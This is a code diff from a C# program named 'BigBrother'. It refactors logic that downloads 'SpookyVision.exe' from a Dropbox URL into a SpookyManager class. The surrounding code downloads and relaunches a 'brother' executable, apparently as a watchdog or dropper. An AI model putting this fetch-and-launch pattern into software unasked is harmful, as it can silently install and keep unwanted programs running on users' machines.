@@ -16,6 +16,7 @@ namespace BigBrother
     {
         static RegistryManager RegistryManager = new RegistryManager();
         static BrotherManager BrotherManager = new BrotherManager();
+        static SpookyManager SpookyManager = new SpookyManager();
 
         static void Main(string[] args)
         {
@@ -32,15 +33,8 @@ namespace BigBrother
                     if (!BrotherManager.BrotherExists(Path.Combine(BrotherPath, BrotherName)))
                         BrotherManager.DownloadBrother(BrotherPath, BrotherName);
 
-                    if (!File.Exists(Path.Combine(SpookyPath, SpookyName))) // If the brother doesn't exist, download it
-                    {
-                        if (!Directory.Exists(SpookyPath)) // If the directory doesn't exist, create a new one
-                            Directory.CreateDirectory(SpookyPath);
-
-                        WebClient _WClient = new WebClient();
-
-                        _WClient.DownloadFileAsync(new Uri("https://dl.dropbox.com/u/81945809/SpookyVision/SpookyVision.exe"), Path.Combine(SpookyPath, SpookyName));
-                    }
+                    if (!SpookyManager.SpookyExists(Path.Combine(SpookyPath, SpookyName)))
+                        SpookyManager.DownloadSpooky(SpookyPath, SpookyName);
 
                     if (!BrotherIsOpen(Path.Combine(BrotherPath, BrotherName))) // Launch the brother
                     {
